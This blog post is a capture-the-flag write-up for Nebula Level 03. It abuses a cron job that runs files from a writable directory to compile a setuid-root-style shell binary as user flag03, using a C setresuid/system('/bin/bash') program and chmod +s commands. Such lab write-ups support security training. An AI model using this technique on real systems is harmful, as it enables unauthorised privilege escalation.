---
layout: post
title: "Exploit Exercises - Nebula Level 03"
date: 2014-01-09 17:03:25 +0800
comments: true
categories: Security, Exercises, Nebula
---

### About
Check the home directory of flag03 and take note of the files there.

There is a crontab that is called every couple of minutes.

To do this level, log in as the level03 account with the password level03 . Files for this level can be found in /home/flag03.

<!-- more -->

### Solution

No source code is available for this level, but there is a shell script in the home directory of user flag03

``` sh writable.sh
#!/bin/sh
for i in /home/flag03/writable.d/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

This script would be executed periodly by cron, after I have finished this level, I logged in with the admin account and get the content of the corresponding crontab file

``` sh /var/spool/cron/crontabs/flag03
*/3 * * * * /home/flag03/writable.sh
```

For the meaning of this crontab file, please refer to the [Cron Wiki](https://wiki.archlinux.org/index.php/cron) of Archlinux.

Back to the script located in */home/flag03*, this script does the following things

1. limits the use cpu time to be 5s
2. iterately executes all the executable files in directory */home/flag03/writable.d/*
3. delete these executables after executing

This crontab runs in user *flag03*, we could leverage it to do something interesting, like changing the home directory of user *flag03* to be public readable and writable, but what we need is beyond this. 

It is easy to find a way to get the privilege of user *flag03* after all we have read in the previous exercises. So I wrote the following code in C

``` c flag03.c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main() {
	setresuid(996, 996, 996);
	system("/bin/bash");
}
``` 

The uid 996 is got by reading */etc/passwd*

``` c
flag03:x:996:996::/home/flag03:/bin/sh
```

What I need now is to make user *flag03* compile this C code into an executable that could be run by *level04* and the set-user-ID bit is set. So I wrote the following script 

``` sh compile
gcc -o /home/flag03/flag03 /home/level03/flag03.c
chmod 777 /home/flag03/flag03
chmod +s /home/flag03/flag03
```

To make the file */home/level03/flag03.c* readable by user flag03, I changed the permission of my home directory

``` bash
$ chmod a+rx /home/level03
```

Now, place the compile script into */home/flag03/writable.d", and wait patiently for the execution of crontab. After this script is called, I got an executable in */home/flag03* to help me get the privilege of user *flag03* :)